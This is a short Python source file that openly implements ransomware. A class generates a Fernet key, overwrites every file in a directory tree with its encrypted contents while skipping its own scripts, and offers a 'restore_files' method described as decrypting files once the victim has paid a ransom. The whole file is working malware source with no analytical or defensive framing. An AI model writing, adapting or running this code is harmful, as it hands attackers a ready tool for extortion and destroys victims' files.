from cryptography.fernet import Fernet
import os


class Ransomware:
    """
    The Ransomware class provides methods to deploy the ransomware on the target machine.
    """

    def __init__(self) -> None:
        """
        Initializes the data required for the ransomware operation.
        """

        # Encryption key
        self.key: bytes = Fernet.generate_key()

    def encrypt(self, filename: str) -> None:
        """
        Encrypts a file.

        :param filename: local file name
        """

        # Reading the contents of a file
        with open(filename, 'rb') as original_file:
            original_contents = original_file.read()
        
        # Encrypting the read contents
        encrypted_contents = Fernet(key=self.key).encrypt(data=original_contents)

        # Encrypting the file
        with open(filename, 'wb') as encrypted_file:
            encrypted_file.write(encrypted_contents)

    def decrypt(self, filename: str) -> None:
        """
        Decrypts a file.

        :param filename: local file name
        """

        # Reading the encrypted contents of a file
        with open(filename, 'rb') as encrypted_file:
            encrypted_contents = encrypted_file.read()
        
        # Decrypting the read contents
        decrypted_contents = Fernet(key=self.key).decrypt(data=encrypted_contents)

        # Decrypting the file
        with open(filename, 'wb') as decrypted_file:
            decrypted_file.write(decrypted_contents)

    def scan_file_directory_tree(self, root: str, encryption=True) -> None:
        """
        Scans an entire file directory tree.

        :param root: root of a file directory tree
        :param encryption: indicates the ransomware operation (encrypts or decrypts files)
        """

        os.chdir(path=root)

        for filename in os.listdir():
            # The ransomware has to encrypt all the files, except itself
            if filename == 'main.py' or filename == 'ransomware.py':
                continue

            # File
            if os.path.isfile(path=filename):
                if encryption:
                    self.encrypt(filename=filename)
                else:
                    self.decrypt(filename=filename)
            # Directory
            else:
                os.chdir(path=filename)

                # Recursive scan
                self.scan_file_directory_tree(root=filename, encryption=encryption)
                os.chdir(path='..')

    def restore_files(self, root: str) -> None:
        """
        Restores files to the victim once they have paid a ransom.

        :param root: root of the encrypted file directory tree
        """

        self.scan_file_directory_tree(root=root, encryption=False)
